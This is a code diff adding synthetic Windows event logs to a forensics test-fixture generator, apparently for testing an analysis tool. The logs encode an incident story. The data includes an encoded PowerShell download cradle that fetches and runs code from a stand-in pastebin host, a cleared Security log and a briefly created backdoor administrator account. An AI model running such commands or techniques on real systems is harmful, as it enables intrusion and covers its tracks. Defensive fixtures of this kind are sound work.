@@ -358,6 +358,99 @@ def _plain_zip(members: dict) -> bytes:
     return buf.getvalue()
 
 
+# Windows event logs (Phase 6), written by backend/tests/fixtures/evtx.py. The story they add: alice logs on at 08:52,
+# a "Secure Delete Helper" service is installed from her AppData at 10:07, she logs off for lunch and back on at 13:28,
+# plugs in the SanDisk drive at 14:12:44, runs an encoded PowerShell download cradle at 14:24:30, clears the Security
+# log at 14:25 (so the earlier Security events are gone), unlocks at 14:30, removes the drive at 14:41:10; someone at
+# 192.168.1.66 tries the administrator password three times (too few to count as brute force); a backup_admin account
+# is created and added to Administrators at 15:10 and deleted at 18:30; alice logs off and shuts down at 18:42.
+ALICE_SID = 'S-1-5-21-3623811015-3361044348-30300820-1001'
+BACKDOOR_SID = 'S-1-5-21-3623811015-3361044348-30300820-1002'
+PS_SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("https://pastebin.example.com/raw/x9f2")'
+PS_COMMAND = 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ' + __import__('base64').b64encode(PS_SCRIPT.encode('utf-16-le')).decode()
+SANDISK_SERIAL = '4C530001230518109141'
+LOGS = 'Windows/System32/winevt/Logs'
+AUDIT_SUCCESS, AUDIT_FAILURE, CLASSIC = 0x8020000000000000, 0x8010000000000000, 0x80000000000000
+
+
+def event_logs():
+    import evtx as ev
+    t = lambda h, m, s=0: utc(2026, 9, 1, h, m, s)
+    sec = ('Security', 'Microsoft-Windows-Security-Auditing', '{54849625-5478-4994-A5BA-3E3B0328C30D}')
+
+    def s(eid, when, data, task, keywords=AUDIT_SUCCESS, **kw):  # Security audit events are logged at level 0 (Log Always)
+        return ev.Event(*sec, eid, when, data, level=0, task=task, keywords=keywords, process_id=684, thread_id=1220, **kw)
+
+    who = {'SubjectUserSid': ALICE_SID, 'SubjectUserName': 'alice', 'SubjectDomainName': 'LAPTOP-07', 'SubjectLogonId': '0x3e7a12'}
+    security = [
+        # A cleared log starts again at record 1 with the clearing event, which names who cleared it.
+        ev.Event('Security', 'Microsoft-Windows-Eventlog', '{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}', 1102, t(14, 25), {},
+                 task=104, keywords=0x4020000000000000, process_id=1344, thread_id=5932,
+                 user_data=('LogFileCleared', 'http://manifests.microsoft.com/win/2004/08/windows/eventlog', who)),
+        s(4624, t(14, 30, 12), {'SubjectUserSid': 'S-1-5-18', 'SubjectUserName': 'LAPTOP-07$', 'SubjectDomainName': 'WORKGROUP',
+                                 'SubjectLogonId': '0x3e7', 'TargetUserSid': ALICE_SID, 'TargetUserName': 'alice', 'TargetDomainName': 'LAPTOP-07',
+                                 'TargetLogonId': '0x3e7a12', 'LogonType': '7', 'LogonProcessName': 'User32', 'AuthenticationPackageName': 'Negotiate',
+                                 'WorkstationName': 'LAPTOP-07', 'ProcessName': 'C:\\Windows\\System32\\svchost.exe', 'IpAddress': '127.0.0.1',
+                                 'IpPort': '0'}, 12544),
+    ] + [
+        s(4625, t(15, 2, second), {'SubjectUserSid': 'S-1-0-0', 'TargetUserName': 'administrator', 'TargetDomainName': 'LAPTOP-07',
+                                    'Status': '0xc000006d', 'FailureReason': '%%2313', 'SubStatus': '0xc000006a', 'LogonType': '3',
+                                    'LogonProcessName': 'NtLmSsp', 'AuthenticationPackageName': 'NTLM', 'WorkstationName': 'KALI',
+                                    'IpAddress': '192.168.1.66', 'IpPort': '49812'}, 12544, AUDIT_FAILURE)
+        for second in (10, 25, 41)
+    ] + [
+        s(4720, t(15, 10, 5), dict(who, TargetUserName='backup_admin', TargetDomainName='LAPTOP-07', TargetSid=BACKDOOR_SID,
+                                   SamAccountName='backup_admin', UserAccountControl='%%2080 %%2082 %%2084'), 13824),
+        s(4732, t(15, 10, 20), dict(who, MemberName='-', MemberSid=BACKDOOR_SID, TargetUserName='Administrators', TargetDomainName='Builtin',
+                                    TargetSid='S-1-5-32-544'), 13826),
+        s(4726, t(18, 30), dict(who, TargetUserName='backup_admin', TargetDomainName='LAPTOP-07', TargetSid=BACKDOOR_SID), 13824),
+        s(4647, t(18, 41, 30), {'TargetUserSid': ALICE_SID, 'TargetUserName': 'alice', 'TargetDomainName': 'LAPTOP-07', 'TargetLogonId': '0x3e7a12'},
+          12545),
+    ]
+    winlogon = ('System', 'Microsoft-Windows-Winlogon', '{DBE9B383-7CF3-4331-91CC-A3CB16A3B538}')
+    session = {'TSId': '1', 'UserSid': ALICE_SID}
+    system = [
+        ev.Event('System', 'EventLog', '', 6005, t(8, 50, 2), [], keywords=CLASSIC),
+        ev.Event(*winlogon, 7001, t(8, 52, 10), session, task=1101, user_sid='S-1-5-18'),
+        ev.Event('System', 'Service Control Manager', '{555908d1-a6d7-4695-8e1e-26931d2012f4}', 7045, t(10, 7, 30),
+                 {'ServiceName': 'Secure Delete Helper', 'ImagePath': 'C:\\Users\\alice\\AppData\\Roaming\\sdsvc.exe',
+                  'ServiceType': 'user mode service', 'StartType': 'auto start', 'AccountName': 'LocalSystem'},
+                 keywords=CLASSIC, user_sid=ALICE_SID, process_id=712, thread_id=3344),
+        ev.Event(*winlogon, 7002, t(12, 31, 4), session, task=1102, user_sid='S-1-5-18'),
+        ev.Event(*winlogon, 7001, t(13, 28, 41), session, task=1101, user_sid='S-1-5-18'),
+        ev.Event('System', 'User32', '{b0aa8734-56f7-41cc-b2f4-de228e98b946}', 1074, t(18, 42),
+                 {'param1': 'C:\\Windows\\Explorer.EXE (LAPTOP-07)', 'param2': 'LAPTOP-07', 'param3': 'Other (Unplanned)', 'param4': '0x0',
+                  'param5': 'power off', 'param6': '', 'param7': 'LAPTOP-07\\alice'}, keywords=CLASSIC, user_sid=ALICE_SID),
+        ev.Event('System', 'EventLog', '', 6006, t(18, 42, 5), [], keywords=CLASSIC),
+    ]
+    ps_op = [ev.Event('Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}',
+                      4104, t(14, 24, 31), {'MessageNumber': '1', 'MessageTotal': '1', 'ScriptBlockText': PS_SCRIPT,
+                                            'ScriptBlockId': '{5b1c7e9a-2d4f-4b8e-9c3a-1f0e2d3c4b5a}', 'Path': ''},
+                      level=3, task=2, opcode=15, keywords=0x0, user_sid=ALICE_SID, process_id=7716, thread_id=6120)]
+
+    def details(new, previous):  # the third value of a classic PowerShell engine event: key=value lines
+        return (f'NewEngineState={new}\r\n\tPreviousEngineState={previous}\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n'
+                '\tHostVersion=5.1.19041.4780\r\n\tHostId=3c9b8d0e-6a7f-4e21-9b1c-2d3e4f5a6b7c\r\n'
+                f'\tHostApplication={PS_COMMAND}\r\n\tEngineVersion=5.1.19041.4780\r\n\tRunspaceId=8f0d6f3e-1b2c-4d5e-9f6a-7b8c9d0e1f2a\r\n')
+    ps_classic = [ev.Event('Windows PowerShell', 'PowerShell', '', 400, t(14, 24, 30), ['Available', 'None', details('Available', 'None')],
+                           task=4, keywords=CLASSIC, process_id=7716, thread_id=0),
+                  ev.Event('Windows PowerShell', 'PowerShell', '', 403, t(14, 24, 33), ['Stopped', 'Available', details('Stopped', 'Available')],
+                           task=4, keywords=CLASSIC, process_id=7716, thread_id=0)]
+    disk = {'Version': '2', 'DiskNumber': '1', 'Flags': '0x0', 'Characteristics': '0x100000', 'IsSystem': 'false', 'IsBoot': 'false',
+            'BusType': '7', 'Manufacturer': 'SanDisk', 'Model': 'Cruzer Blade', 'Revision': '1.00', 'SerialNumber': SANDISK_SERIAL,
+            'Location': 'Integrated : Adapter 0 : Port 0 : Target 0 : LUN 0', 'ParentId': f'USB\\VID_0781&PID_5567\\{SANDISK_SERIAL}',
+            'BytesPerSector': '512'}
+    part = ('Microsoft-Windows-Partition/Diagnostic', 'Microsoft-Windows-Partition', '{412bdff2-a8c4-470d-8f33-63fe0d8c20e2}')
+    partition = [ev.Event(*part, 1006, t(14, 12, 44), dict(disk, Capacity='15931539456', PartitionCount='1'), task=1006, keywords=0x0,
+                          user_sid='S-1-5-18'),
+                 ev.Event(*part, 1006, t(14, 41, 10), dict(disk, Capacity='0', PartitionCount='0'), task=1006, keywords=0x0, user_sid='S-1-5-18')]
+    write(f'{LOGS}/Security.evtx', ev.write_evtx(security, first_record_id=1))
+    write(f'{LOGS}/System.evtx', ev.write_evtx(system, first_record_id=4512))
+    write(f'{LOGS}/Microsoft-Windows-PowerShell%4Operational.evtx', ev.write_evtx(ps_op, first_record_id=812))
+    write(f'{LOGS}/Windows PowerShell.evtx', ev.write_evtx(ps_classic, first_record_id=233))
+    write(f'{LOGS}/Microsoft-Windows-Partition%4Diagnostic.evtx', ev.write_evtx(partition, first_record_id=57))
+
+
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
     write('Windows/INF/setupapi.dev.log', SETUPAPI.replace('\n', '\r\n'))
@@ -377,6 +470,7 @@ def main():
     hidden_files()
     content_files()
     container_files()
+    event_logs()
     print(PREFETCH_NAME)
 
 
